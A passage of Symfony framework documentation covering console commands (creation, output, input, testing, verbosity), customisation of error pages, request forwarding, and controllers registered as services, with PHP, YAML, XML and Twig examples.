    package for your OS (typically named ``bash-completion``).

After installing and restarting your terminal, you're all set to use
completion (by default, by pressing the Tab key).

.. tip::

    Many PHP tools are built using the Symfony Console component (e.g.
    Composer, PHPstan and Behat). If they are using version 5.4 or higher,
    you can also install their completion script to enable console completion:

    .. code-block:: terminal

        $ php vendor/bin/phpstan completion --help
        $ composer completion --help

Creating a Command
------------------

Commands are defined in classes extending
:class:`Symfony\\Component\\Console\\Command\\Command`. For example, you may
want a command to create a user::

    // src/Command/CreateUserCommand.php
    namespace App\Command;

    use Symfony\Component\Console\Attribute\AsCommand;
    use Symfony\Component\Console\Command\Command;
    use Symfony\Component\Console\Input\InputInterface;
    use Symfony\Component\Console\Output\OutputInterface;

    // the name of the command is what users type after "php bin/console"
    #[AsCommand(name: 'app:create-user')]
    class CreateUserCommand extends Command
    {
        protected function execute(InputInterface $input, OutputInterface $output): int
        {
            // ... put here the code to create the user

            // this method must return an integer number with the "exit status code"
            // of the command. You can also use these constants to make code more readable

            // return this if there was no problem running the command
            // (it's equivalent to returning int(0))
            return Command::SUCCESS;

            // or return this if some error happened during the execution
            // (it's equivalent to returning int(1))
            // return Command::FAILURE;

            // or return this to indicate incorrect command usage; e.g. invalid options
            // or missing arguments (it's equivalent to returning int(2))
            // return Command::INVALID
        }
    }

Configuring the Command
~~~~~~~~~~~~~~~~~~~~~~~

You can optionally define a description, help message and the
:doc:`input options and arguments </console/input>` by overriding the
``configure()`` method::

    // src/Command/CreateUserCommand.php

    // ...
    class CreateUserCommand extends Command
    {
        // ...
        protected function configure(): void
        {
            $this
                // the command description shown when running "php bin/console list"
                ->setDescription('Creates a new user.')
                // the command help shown when running the command with the "--help" option
                ->setHelp('This command allows you to create a user...')
            ;
        }
    }

.. tip::

    Using the ``#[AsCommand]`` attribute to define a description instead of
    using the ``setDescription()`` method allows to get the command description without
    instantiating its class. This makes the ``php bin/console list`` command run
    much faster.

    If you want to always run the ``list`` command fast, add the ``--short`` option
    to it (``php bin/console list --short``). This will avoid instantiating command
    classes, but it won't show any description for commands that use the
    ``setDescription()`` method instead of the attribute to define the command
    description.

The ``configure()`` method is called automatically at the end of the command
constructor. If your command defines its own constructor, set the properties
first and then call to the parent constructor, to make those properties
available in the ``configure()`` method::

    // ...
    use Symfony\Component\Console\Command\Command;
    use Symfony\Component\Console\Input\InputArgument;

    class CreateUserCommand extends Command
    {
        // ...

        public function __construct(bool $requirePassword = false)
        {
            // best practices recommend to call the parent constructor first and
            // then set your own properties. That wouldn't work in this case
            // because configure() needs the properties set in this constructor
            $this->requirePassword = $requirePassword;

            parent::__construct();
        }

        protected function configure(): void
        {
            $this
                // ...
                ->addArgument('password', $this->requirePassword ? InputArgument::REQUIRED : InputArgument::OPTIONAL, 'User password')
            ;
        }
    }

.. _console_registering-the-command:

Registering the Command
~~~~~~~~~~~~~~~~~~~~~~~

You can register the command by adding the ``AsCommand`` attribute to it::

    // src/Command/CreateUserCommand.php
    namespace App\Command;

    use Symfony\Component\Console\Attribute\AsCommand;
    use Symfony\Component\Console\Command\Command;

    #[AsCommand(
        name: 'app:create-user',
        description: 'Creates a new user.',
        hidden: false,
        aliases: ['app:add-user']
    )]
    class CreateUserCommand extends Command
    {
        // ...
    }

If you can't use PHP attributes, register the command as a service and
:doc:`tag it </service_container/tags>` with the ``console.command`` tag. If you're using the
:ref:`default services.yaml configuration <service-container-services-load-example>`,
this is already done for you, thanks to :ref:`autoconfiguration <services-autoconfigure>`.

Running the Command
~~~~~~~~~~~~~~~~~~~

After configuring and registering the command, you can run it in the terminal:

.. code-block:: terminal

    $ php bin/console app:create-user

As you might expect, this command will do nothing as you didn't write any logic
yet. Add your own logic inside the ``execute()`` method.

Console Output
--------------

The ``execute()`` method has access to the output stream to write messages to
the console::

    // ...
    protected function execute(InputInterface $input, OutputInterface $output): int
    {
        // outputs multiple lines to the console (adding "\n" at the end of each line)
        $output->writeln([
            'User Creator',
            '============',
            '',
        ]);

        // the value returned by someMethod() can be an iterator (https://php.net/iterator)
        // that generates and returns the messages with the 'yield' PHP keyword
        $output->writeln($this->someMethod());

        // outputs a message followed by a "\n"
        $output->writeln('Whoa!');

        // outputs a message without adding a "\n" at the end of the line
        $output->write('You are about to ');
        $output->write('create a user.');

        return Command::SUCCESS;
    }

Now, try executing the command:

.. code-block:: terminal

    $ php bin/console app:create-user
    User Creator
    ============

    Whoa!
    You are about to create a user.

.. _console-output-sections:

Output Sections
~~~~~~~~~~~~~~~

The regular console output can be divided into multiple independent regions
called "output sections". Create one or more of these sections when you need to
clear and overwrite the output information.

Sections are created with the
:method:`ConsoleOutput::section() <Symfony\\Component\\Console\\Output\\ConsoleOutput::section>`
method, which returns an instance of
:class:`Symfony\\Component\\Console\\Output\\ConsoleSectionOutput`::

    // ...
    use Symfony\Component\Console\Output\ConsoleOutputInterface;

    class MyCommand extends Command
    {
        protected function execute(InputInterface $input, OutputInterface $output): int
        {
            if (!$output instanceof ConsoleOutputInterface) {
                throw new \LogicException('This command accepts only an instance of "ConsoleOutputInterface".');
            }

            $section1 = $output->section();
            $section2 = $output->section();

            $section1->writeln('Hello');
            $section2->writeln('World!');
            sleep(1);
            // Output displays "Hello\nWorld!\n"

            // overwrite() replaces all the existing section contents with the given content
            $section1->overwrite('Goodbye');
            sleep(1);
            // Output now displays "Goodbye\nWorld!\n"

            // clear() deletes all the section contents...
            $section2->clear();
            sleep(1);
            // Output now displays "Goodbye\n"

            // ...but you can also delete a given number of lines
            // (this example deletes the last two lines of the section)
            $section1->clear(2);
            sleep(1);
            // Output is now completely empty!

            // setting the max height of a section will make new lines replace the old ones
            $section1->setMaxHeight(2);
            $section1->writeln('Line1');
            $section1->writeln('Line2');
            $section1->writeln('Line3');

            return Command::SUCCESS;
        }
    }

.. note::

    A new line is appended automatically when displaying information in a section.

Output sections let you manipulate the Console output in advanced ways, such as
:ref:`displaying multiple progress bars <console-multiple-progress-bars>` which
are updated independently and :ref:`appending rows to tables <console-modify-rendered-tables>`
that have already been rendered.

.. caution::

    Terminals only allow overwriting the visible content, so you must take into
    account the console height when trying to write/overwrite section contents.

Console Input
-------------

Use input options or arguments to pass information to the command::

    use Symfony\Component\Console\Input\InputArgument;

    // ...
    protected function configure(): void
    {
        $this
            // configure an argument
            ->addArgument('username', InputArgument::REQUIRED, 'The username of the user.')
            // ...
        ;
    }

    // ...
    public function execute(InputInterface $input, OutputInterface $output): int
    {
        $output->writeln([
            'User Creator',
            '============',
            '',
        ]);

        // retrieve the argument value using getArgument()
        $output->writeln('Username: '.$input->getArgument('username'));

        return Command::SUCCESS;
    }

Now, you can pass the username to the command:

.. code-block:: terminal

    $ php bin/console app:create-user Wouter
    User Creator
    ============

    Username: Wouter

.. seealso::

    Read :doc:`/console/input` for more information about console options and
    arguments.

Getting Services from the Service Container
-------------------------------------------

To actually create a new user, the command has to access some
:doc:`services </service_container>`. Since your command is already registered
as a service, you can use normal dependency injection. Imagine you have a
``App\Service\UserManager`` service that you want to access::

    // ...
    use App\Service\UserManager;
    use Symfony\Component\Console\Command\Command;

    class CreateUserCommand extends Command
    {
        public function __construct(
            private UserManager $userManager,
        ){
            parent::__construct();
        }

        // ...

        protected function execute(InputInterface $input, OutputInterface $output): int
        {
            // ...

            $this->userManager->create($input->getArgument('username'));

            $output->writeln('User successfully generated!');

            return Command::SUCCESS;
        }
    }

Command Lifecycle
-----------------

Commands have three lifecycle methods that are invoked when running the
command:

:method:`Symfony\\Component\\Console\\Command\\Command::initialize` *(optional)*
    This method is executed before the ``interact()`` and the ``execute()``
    methods. Its main purpose is to initialize variables used in the rest of
    the command methods.

:method:`Symfony\\Component\\Console\\Command\\Command::interact` *(optional)*
    This method is executed after ``initialize()`` and before ``execute()``.
    Its purpose is to check if some of the options/arguments are missing
    and interactively ask the user for those values. This is the last place
    where you can ask for missing required options/arguments. This method is
    called before validating the input.
    Note that it will not be called when the command is run without interaction
    (e.g. when passing the ``--no-interaction`` global option flag).

:method:`Symfony\\Component\\Console\\Command\\Command::execute` *(required)*
    This method is executed after ``interact()`` and ``initialize()``.
    It contains the logic you want the command to execute and it must
    return an integer which will be used as the command `exit status`_.

.. _console-testing-commands:

Testing Commands
----------------

Symfony provides several tools to help you test your commands. The most
useful one is the :class:`Symfony\\Component\\Console\\Tester\\CommandTester`
class. It uses special input and output classes to ease testing without a real
console::

    // tests/Command/CreateUserCommandTest.php
    namespace App\Tests\Command;

    use Symfony\Bundle\FrameworkBundle\Console\Application;
    use Symfony\Bundle\FrameworkBundle\Test\KernelTestCase;
    use Symfony\Component\Console\Tester\CommandTester;

    class CreateUserCommandTest extends KernelTestCase
    {
        public function testExecute(): void
        {
            self::bootKernel();
            $application = new Application(self::$kernel);

            $command = $application->find('app:create-user');
            $commandTester = new CommandTester($command);
            $commandTester->execute([
                // pass arguments to the helper
                'username' => 'Wouter',

                // prefix the key with two dashes when passing options,
                // e.g: '--some-option' => 'option_value',
                // use brackets for testing array value,
                // e.g: '--some-option' => ['option_value'],
            ]);

            $commandTester->assertCommandIsSuccessful();

            // the output of the command in the console
            $output = $commandTester->getDisplay();
            $this->assertStringContainsString('Username: Wouter', $output);

            // ...
        }
    }

If you are using a :doc:`single-command application </components/console/single_command_tool>`,
call ``setAutoExit(false)`` on it to get the command result in ``CommandTester``.

.. tip::

    You can also test a whole console application by using
    :class:`Symfony\\Component\\Console\\Tester\\ApplicationTester`.

.. caution::

    When testing commands using the ``CommandTester`` class, console events are
    not dispatched. If you need to test those events, use the
    :class:`Symfony\\Component\\Console\\Tester\\ApplicationTester` instead.

.. caution::

    When testing commands using the :class:`Symfony\\Component\\Console\\Tester\\ApplicationTester`
    class, don't forget to disable the auto exit flag::

        $application = new Application();
        $application->setAutoExit(false);

        $tester = new ApplicationTester($application);

.. caution::

    When testing ``InputOption::VALUE_NONE`` command options, you must pass ``true``
    to them::

        $commandTester = new CommandTester($command);
        $commandTester->execute(['--some-option' => true]);

.. note::

    When using the Console component in a standalone project, use
    :class:`Symfony\\Component\\Console\\Application`
    and extend the normal ``\PHPUnit\Framework\TestCase``.

When testing your commands, it could be useful to understand how your command
reacts on different settings like the width and the height of the terminal, or
even the color mode being used. You have access to such information thanks to the
:class:`Symfony\\Component\\Console\\Terminal` class::

    use Symfony\Component\Console\Terminal;

    $terminal = new Terminal();

    // gets the number of lines available
    $height = $terminal->getHeight();

    // gets the number of columns available
    $width = $terminal->getWidth();

    // gets the color mode
    $colorMode = $terminal->getColorMode();

    // changes the color mode
    $colorMode = $terminal->setColorMode(AnsiColorMode::Ansi24);

Logging Command Errors
----------------------

Whenever an exception is thrown while running commands, Symfony adds a log
message for it including the entire failing command. In addition, Symfony
registers an :doc:`event subscriber </event_dispatcher>` to listen to the
:ref:`ConsoleEvents::TERMINATE event <console-events-terminate>` and adds a log
message whenever a command doesn't finish with the ``0`` `exit status`_.

Using Events And Handling Signals
---------------------------------

When a command is running, many events are dispatched, one of them allows to
react to signals, read more in :doc:`this section </components/console/events>`.

Profiling Commands
------------------

Symfony allows to profile the execution of any command, including yours. First,
make sure that the :ref:`debug mode <debug-mode>` and the :doc:`profiler </profiler>`
are enabled. Then, add the ``--profile`` option when running the command:

.. code-block:: terminal

    $ php bin/console --profile app:my-command

Symfony will now collect data about the command execution, which is helpful to
debug errors or check other issues. When the command execution is over, the
profile is accessible through the web page of the profiler.

.. tip::

    If you run the command in verbose mode (adding the ``-v`` option), Symfony
    will display in the output a clickable link to the command profile (if your
    terminal supports links). If you run it in debug verbosity (``-vvv``) you'll
    also see the time and memory consumed by the command.

.. caution::

    When profiling the ``messenger:consume`` command from the :doc:`Messenger </messenger>`
    component, add the ``--no-reset`` option to the command or you won't get any
    profile. Moreover, consider using the ``--limit`` option to only process a few
    messages to make the profile more readable in the profiler.

Learn More
----------

.. toctree::
    :maxdepth: 1
    :glob:

    console/*

The console component also contains a set of "helpers" - different small
tools capable of helping you with different tasks:

* :doc:`/components/console/helpers/questionhelper`: interactively ask the user for information
* :doc:`/components/console/helpers/formatterhelper`: customize the output colorization
* :doc:`/components/console/helpers/progressbar`: shows a progress bar
* :doc:`/components/console/helpers/progressindicator`: shows a progress indicator
* :doc:`/components/console/helpers/table`: displays tabular data as a table
* :doc:`/components/console/helpers/debug_formatter`: provides functions to
  output debug information when running an external program
* :doc:`/components/console/helpers/processhelper`: allows to run processes using ``DebugFormatterHelper``
* :doc:`/components/console/helpers/cursor`: allows to manipulate the cursor in the terminal

.. _`exit status`: https://en.wikipedia.org/wiki/Exit_status
Verbosity Levels
================

Console commands have different verbosity levels, which determine the messages
displayed in their output. By default, commands display only the most useful
messages, but you can control their verbosity with the ``-q`` and ``-v`` options:

.. code-block:: terminal

    # do not output any message (not even the command result messages)
    $ php bin/console some-command -q
    $ php bin/console some-command --quiet

    # normal behavior, no option required (display only the useful messages)
    $ php bin/console some-command

    # increase verbosity of messages
    $ php bin/console some-command -v

    # display also the informative non essential messages
    $ php bin/console some-command -vv

    # display all messages (useful to debug errors)
    $ php bin/console some-command -vvv

The verbosity level can also be controlled globally for all commands with the
``SHELL_VERBOSITY`` environment variable (the ``-q`` and ``-v`` options still
have more precedence over the value of ``SHELL_VERBOSITY``):

=====================  =========================  ===========================================
Console option         ``SHELL_VERBOSITY`` value  Equivalent PHP constant
=====================  =========================  ===========================================
``-q`` or ``--quiet``  ``-1``                     ``OutputInterface::VERBOSITY_QUIET``
(none)                 ``0``                      ``OutputInterface::VERBOSITY_NORMAL``
``-v``                 ``1``                      ``OutputInterface::VERBOSITY_VERBOSE``
``-vv``                ``2``                      ``OutputInterface::VERBOSITY_VERY_VERBOSE``
``-vvv``               ``3``                      ``OutputInterface::VERBOSITY_DEBUG``
=====================  =========================  ===========================================

It is possible to print a message in a command for only a specific verbosity
level. For example::

    // ...
    use Symfony\Component\Console\Command\Command;
    use Symfony\Component\Console\Input\InputInterface;
    use Symfony\Component\Console\Output\OutputInterface;

    class CreateUserCommand extends Command
    {
        // ...

        public function execute(InputInterface $input, OutputInterface $output): int
        {
            $user = new User(...);

            $output->writeln([
                'Username: '.$input->getArgument('username'),
                'Password: '.$input->getArgument('password'),
            ]);

            // available methods: ->isQuiet(), ->isVerbose(), ->isVeryVerbose(), ->isDebug()
            if ($output->isVerbose()) {
                $output->writeln('User class: '.get_class($user));
            }

            // alternatively you can pass the verbosity level PHP constant to writeln()
            $output->writeln(
                'Will only be printed in verbose mode or higher',
                OutputInterface::VERBOSITY_VERBOSE
            );

            return Command::SUCCESS;
        }
    }

When the quiet level is used, all output is suppressed as the default
:method:`Symfony\\Component\\Console\\Output\\Output::write` method returns
without actually printing.

.. tip::

    The MonologBridge provides a :class:`Symfony\\Bridge\\Monolog\\Handler\\ConsoleHandler`
    class that allows you to display messages on the console. This is cleaner
    than wrapping your output calls in conditions. For an example use in
    the Symfony Framework, see :doc:`/logging/monolog_console`.

.. tip::

    The full exception stacktrace is printed if the ``VERBOSITY_VERBOSE``
    level or above is used.
Contributing
============

.. include:: /contributing/map.rst.inc
* **Code of Conduct**

  * :doc:`/contributing/code_of_conduct/code_of_conduct`
  * :doc:`/contributing/code_of_conduct/reporting_guidelines`
  * :doc:`/contributing/code_of_conduct/care_team`
  * :doc:`/contributing/code_of_conduct/concrete_example_document`

* **Code**

  * :doc:`Bugs </contributing/code/bugs>`
  * :doc:`Getting a Stack Trace </contributing/code/stack_trace>`
  * :doc:`Pull Requests </contributing/code/pull_requests>`
  * :doc:`Reviewing Issues and Pull Requests </contributing/community/reviews>`
  * :doc:`Maintenance </contributing/code/maintenance>`
  * :doc:`The Core Team </contributing/code/core_team>`
  * :doc:`Security </contributing/code/security>`
  * :doc:`Tests </contributing/code/tests>`
  * :doc:`Backward Compatibility </contributing/code/bc>`
  * :doc:`Coding Standards </contributing/code/standards>`
  * :doc:`Code Conventions </contributing/code/conventions>`
  * :doc:`Git </contributing/code/git>`
  * :doc:`License </contributing/code/license>`

* **Documentation**

  * :doc:`Overview </contributing/documentation/overview>`
  * :doc:`Format </contributing/documentation/format>`
  * :doc:`Documentation Standards </contributing/documentation/standards>`
  * :doc:`License </contributing/documentation/license>`

* **Community**

  * :doc:`Release Process </contributing/community/releases>`
  * :doc:`Respectful Review comments </contributing/community/review-comments>`
  * :doc:`Community Reviews </contributing/community/reviews>`

* **Diversity**

  * :doc:`Governance </contributing/diversity/governance>`
How to Customize Error Pages
============================

In Symfony applications, all errors are treated as exceptions, no matter if they
are a 404 Not Found error or a fatal error triggered by throwing some exception
in your code.

In the :ref:`development environment <configuration-environments>`,
Symfony catches all the exceptions and displays a special **exception page**
with lots of debug information to help you discover the root problem:

.. image:: /_images/controller/error_pages/exceptions-in-dev-environment.png
    :alt: A typical exception page in the development environment with the full stacktrace and log information.
    :class: with-browser

Since these pages contain a lot of sensitive internal information, Symfony won't
display them in the production environment. Instead, it'll show a minimal and
generic **error page**:

.. image:: /_images/controller/error_pages/errors-in-prod-environment.png
    :alt: A typical error page in the production environment.
    :class: with-browser

Error pages for the production environment can be customized in different ways
depending on your needs:

#. If you only want to change the contents and styles of the error pages to match
   the rest of your application, :ref:`override the default error templates <use-default-error-controller>`;

#. If you want to change the contents of non-HTML error output,
   :ref:`create a new normalizer <overriding-non-html-error-output>`;

#. If you also want to tweak the logic used by Symfony to generate error pages,
   :ref:`override the default error controller <custom-error-controller>`;

#. If you need total control of exception handling to run your own logic
   :ref:`use the kernel.exception event <use-kernel-exception-event>`.

.. _use-default-error-controller:
.. _using-the-default-errorcontroller:

Overriding the Default Error Templates
--------------------------------------

You can use the built-in Twig error renderer to override the default error
templates. Both the TwigBundle and TwigBridge need to be installed for this. Run
this command to ensure both are installed:

.. code-block:: terminal

    $ composer require symfony/twig-pack

When the error page loads, :class:`Symfony\\Bridge\\Twig\\ErrorRenderer\\TwigErrorRenderer`
is used to render a Twig template to show the user.

.. _controller-error-pages-by-status-code:

This renderer uses the HTTP status code and the following
logic to determine the template filename:

#. Look for a template for the given status code (like ``error500.html.twig``);

#. If the previous template doesn't exist, discard the status code and look for
   a generic error template (``error.html.twig``).

.. _overriding-or-adding-templates:

To override these templates, rely on the standard Symfony method for
:ref:`overriding templates that live inside a bundle <override-templates>` and
put them in the ``templates/bundles/TwigBundle/Exception/`` directory.

A typical project that returns HTML pages might look like this:

.. code-block:: text

    templates/
    └─ bundles/
       └─ TwigBundle/
          └─ Exception/
             ├─ error404.html.twig
             ├─ error403.html.twig
             └─ error.html.twig      # All other HTML errors (including 500)

Example 404 Error Template
--------------------------

To override the 404 error template for HTML pages, create a new
``error404.html.twig`` template located at ``templates/bundles/TwigBundle/Exception/``:

.. code-block:: html+twig

    {# templates/bundles/TwigBundle/Exception/error404.html.twig #}
    {% extends 'base.html.twig' %}

    {% block body %}
        <h1>Page not found</h1>

        <p>
            The requested page couldn't be located. Checkout for any URL
            misspelling or <a href="{{ path('homepage') }}">return to the homepage</a>.
        </p>
    {% endblock %}

In case you need them, the ``TwigErrorRenderer`` passes some information to
the error template via the ``status_code`` and ``status_text`` variables that
store the HTTP status code and message respectively.

.. tip::

    You can customize the status code of an exception by implementing
    :class:`Symfony\\Component\\HttpKernel\\Exception\\HttpExceptionInterface`
    and its required ``getStatusCode()`` method. Otherwise, the ``status_code``
    will default to ``500``.

Additionally you have access to the :class:`Symfony\\Component\\HttpKernel\\Exception\\HttpException`
object via the ``exception`` Twig variable. For example, if the exception sets a
message (e.g. using ``throw $this->createNotFoundException('The product does not exist')``),
use ``{{ exception.message }}`` to print that message. You can also output the
stack trace using ``{{ exception.traceAsString }}``, but don't do that for end
users because the trace contains sensitive data.

.. tip::

    PHP errors are turned into exceptions as well by default, so you can also
    access these error details using ``exception``.

Security & 404 Pages
--------------------

Due to the order of how routing and security are loaded, security information will
*not* be available on your 404 pages. This means that it will appear as if your
user is logged out on the 404 page (it will work while testing, but not on production).

.. _testing-error-pages:

Testing Error Pages during Development
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

While you're in the development environment, Symfony shows the big *exception*
page instead of your shiny new customized error page. So, how can you see
what it looks like and debug it?

Fortunately, the default ``ErrorController`` allows you to preview your
*error* pages during development.

To use this feature, you need to load some special routes provided by FrameworkBundle
(if the application uses :ref:`Symfony Flex <symfony-flex>` they are loaded
automatically when installing ``symfony/framework-bundle``):

.. configuration-block::

    .. code-block:: yaml

        # config/routes/framework.yaml
        when@dev:
            _errors:
                resource: '@FrameworkBundle/Resources/config/routing/errors.xml'
                prefix:   /_error

    .. code-block:: xml

        <!-- config/routes/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing
                https://symfony.com/schema/routing/routing-1.0.xsd">

            <when env="dev">
                <import resource="@FrameworkBundle/Resources/config/routing/errors.xml" prefix="/_error"/>
            </when>
        </routes>

    .. code-block:: php

        // config/routes/framework.php
        use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

        return function (RoutingConfigurator $routes): void {
            if ('dev' === $routes->env()) {
                $routes->import('@FrameworkBundle/Resources/config/routing/errors.xml')
                    ->prefix('/_error')
                ;
            }
        };

With this route added, you can use URLs like these to preview the *error* page
for a given status code as HTML or for a given status code and format (you might
need to replace ``http://localhost/`` by the host used in your local setup):

* ``http://localhost/_error/{statusCode}`` for HTML
* ``http://localhost/_error/{statusCode}.{format}`` for any other format

.. _overriding-non-html-error-output:

Overriding Error output for non-HTML formats
--------------------------------------------

To override non-HTML error output, the Serializer component needs to be installed.

.. code-block:: terminal

    $ composer require symfony/serializer-pack

The Serializer component has a built-in ``FlattenException`` normalizer
(:class:`Symfony\\Component\\Serializer\\Normalizer\\ProblemNormalizer`) and
JSON/XML/CSV/YAML encoders. When your application throws an exception, Symfony
can output it in one of those formats. If you want to change the output
contents, create a new Normalizer that supports the ``FlattenException`` input::

    # src/Serializer/MyCustomProblemNormalizer.php
    namespace App\Serializer;

    use Symfony\Component\ErrorHandler\Exception\FlattenException;
    use Symfony\Component\Serializer\Normalizer\NormalizerInterface;

    class MyCustomProblemNormalizer implements NormalizerInterface
    {
        public function normalize($exception, ?string $format = null, array $context = []): array
        {
            return [
                'content' => 'This is my custom problem normalizer.',
                'exception'=> [
                    'message' => $exception->getMessage(),
                    'code' => $exception->getStatusCode(),
                ],
            ];
        }

        public function supportsNormalization($data, ?string $format = null, array $context = []): bool
        {
            return $data instanceof FlattenException;
        }
    }

.. _custom-error-controller:
.. _replacing-the-default-errorcontroller:

Overriding the Default ErrorController
--------------------------------------

If you need a little more flexibility beyond just overriding the template,
then you can change the controller that renders the error page. For example,
you might need to pass some additional variables into your template.

To do this, create a new controller anywhere in your application and set
the :ref:`framework.error_controller <config-framework-error_controller>`
configuration option to point to it:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/framework.yaml
        framework:
            error_controller: App\Controller\ErrorController::show

    .. code-block:: xml

        <!-- config/packages/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <framework:config>
                <framework:error-controller>App\Controller\ErrorController::show</framework:error-controller>
            </framework:config>

        </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            // ...
            $framework->errorController('App\Controller\ErrorController::show');
        };

The :class:`Symfony\\Component\\HttpKernel\\EventListener\\ErrorListener`
class used by the FrameworkBundle as a listener of the ``kernel.exception`` event creates
the request that will be dispatched to your controller. In addition, your controller
will be passed two parameters:

``exception``
    The original :phpclass:`Throwable` instance being handled.

``logger``
    A :class:`\\Symfony\\Component\\HttpKernel\\Log\\DebugLoggerInterface`
    instance which may be ``null`` in some circumstances.

.. tip::

    The :ref:`error page preview <testing-error-pages>` also works for
    your own controllers set up this way.

.. _use-kernel-exception-event:

Working with the ``kernel.exception`` Event
-------------------------------------------

When an exception is thrown, the :class:`Symfony\\Component\\HttpKernel\\HttpKernel`
class catches it and dispatches a ``kernel.exception`` event. This gives you the
power to convert the exception into a ``Response`` in a few different ways.

Working with this event is actually much more powerful than what has been explained
before, but also requires a thorough understanding of Symfony internals. Suppose
that your code throws specialized exceptions with a particular meaning to your
application domain.

:doc:`Writing your own event listener </event_dispatcher>`
for the ``kernel.exception`` event allows you to have a closer look at the exception
and take different actions depending on it. Those actions might include logging
the exception, redirecting the user to another page or rendering specialized
error pages.

.. note::

    If your listener calls ``setThrowable()`` on the
    :class:`Symfony\\Component\\HttpKernel\\Event\\ExceptionEvent`
    event, propagation will be stopped and the response will be sent to
    the client.

This approach allows you to create centralized and layered error handling:
instead of catching (and handling) the same exceptions in various controllers
time and again, you can have just one (or several) listeners deal with them.

.. tip::

    See :class:`Symfony\\Component\\Security\\Http\\Firewall\\ExceptionListener`
    class code for a real example of an advanced listener of this type. This
    listener handles various security-related exceptions that are thrown in
    your application (like :class:`Symfony\\Component\\Security\\Core\\Exception\\AccessDeniedException`)
    and takes measures like redirecting the user to the login page, logging them
    out and other things.
How to Forward Requests to another Controller
=============================================

Though not very common, you can also forward to another controller internally
with the ``forward()`` method provided by the
:class:`Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController`
class.

Instead of redirecting the user's browser, this makes an "internal" sub-request
and calls the defined controller. The ``forward()`` method returns the
:class:`Symfony\\Component\\HttpFoundation\\Response` object that is returned
from *that* controller::

    public function index($name): Response
    {
        $response = $this->forward('App\Controller\OtherController::fancy', [
            'name'  => $name,
            'color' => 'green',
        ]);

        // ... further modify the response or return it directly

        return $response;
    }

The array passed to the method becomes the arguments for the resulting controller.
The target controller method might look something like this::

    public function fancy(string $name, string $color): Response
    {
        // ... create and return a Response object
    }

Like when creating a controller for a route, the order of the arguments of the
``fancy()`` method doesn't matter: the matching is done by name.
How to Define Controllers as Services
=====================================

In Symfony, a controller does *not* need to be registered as a service. But if
you're using the :ref:`default services.yaml configuration <service-container-services-load-example>`,
and your controllers extend the `AbstractController`_ class, they *are* automatically
registered as services. This means you can use dependency injection like any
other normal service.

If your controllers don't extend the `AbstractController`_ class, you must
explicitly mark your controller services as ``public``. Alternatively, you can
apply the ``controller.service_arguments`` tag to your controller services. This
will make the tagged services ``public`` and will allow you to inject services
in method parameters:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml

        # controllers are imported separately to make sure services can be injected
        # as action arguments even if you don't extend any base controller class
        App\Controller\:
           resource: '../src/Controller/'
           tags: ['controller.service_arguments']

.. note::

    If you don't use either :doc:`autowiring </service_container/autowiring>`
    or :ref:`autoconfiguration <services-autoconfigure>` and you extend the
    ``AbstractController``, you'll need to apply other tags and make some method
    calls to register your controllers as services:

    .. code-block:: yaml

        # config/services.yaml

        # this extended configuration is only required when not using autowiring/autoconfiguration,
        # which is uncommon and not recommended

        abstract_controller.locator:
            class: Symfony\Component\DependencyInjection\ServiceLocator
            arguments:
                -
                    router: '@router'
                    request_stack: '@request_stack'
                    http_kernel: '@http_kernel'
                    session: '@session'
                    parameter_bag: '@parameter_bag'
                    # you can add more services here as you need them (e.g. the `serializer`
                    # service) and have a look at the AbstractController class to see
                    # which services are defined in the locator

        App\Controller\:
            resource: '../src/Controller/'
            tags: ['controller.service_arguments']
            calls:
                - [setContainer, ['@abstract_controller.locator']]

If you prefer, you can use the ``#[AsController]`` PHP attribute to automatically
apply the ``controller.service_arguments`` tag to your controller services::

    // src/Controller/HelloController.php
    namespace App\Controller;

    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\HttpKernel\Attribute\AsController;
    use Symfony\Component\Routing\Attribute\Route;

    #[AsController]
    class HelloController
    {
        #[Route('/hello', name: 'hello', methods: ['GET'])]
        public function index(): Response
        {
            // ...
        }
    }

Registering your controller as a service is the first step, but you also need to
update your routing config to reference the service properly, so that Symfony
knows to use it.

Use the ``service_id::method_name`` syntax to refer to the controller method.
If the service id is the fully-qualified class name (FQCN) of your controller,
as Symfony recommends, then the syntax is the same as if the controller was not
a service like: ``App\Controller\HelloController::index``:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Controller/HelloController.php
        namespace App\Controller;

        use Symfony\Component\HttpFoundation\Response;
        use Symfony\Component\Routing\Attribute\Route;

        class HelloController
        {
            #[Route('/hello', name: 'hello', methods: ['GET'])]
            public function index(): Response
            {
                // ...
            }
        }

    .. code-block:: yaml

        # config/routes.yaml
        hello:
            path:       /hello
            controller: App\Controller\HelloController::index
            methods:    GET

    .. code-block:: xml

        <!-- config/routes.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing
                https://symfony.com/schema/routing/routing-1.0.xsd">

            <route id="hello" path="/hello" controller="App\Controller\HelloController::index" methods="GET"/>

        </routes>

    .. code-block:: php

        // config/routes.php
        use App\Controller\HelloController;
        use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

        return function (RoutingConfigurator $routes): void {
            $routes->add('hello', '/hello')
                ->controller([HelloController::class, 'index'])
                ->methods(['GET'])
            ;
        };

.. _controller-service-invoke:

Invokable Controllers
---------------------

Controllers can also define a single action using the ``__invoke()`` method,
which is a common practice when following the `ADR pattern`_
(Action-Domain-Responder):

.. configuration-block::

    .. code-block:: php-attributes

        // src/Controller/Hello.php
        namespace App\Controller;

        use Symfony\Component\HttpFoundation\Response;
        use Symfony\Component\Routing\Attribute\Route;

        #[Route('/hello/{name}', name: 'hello')]
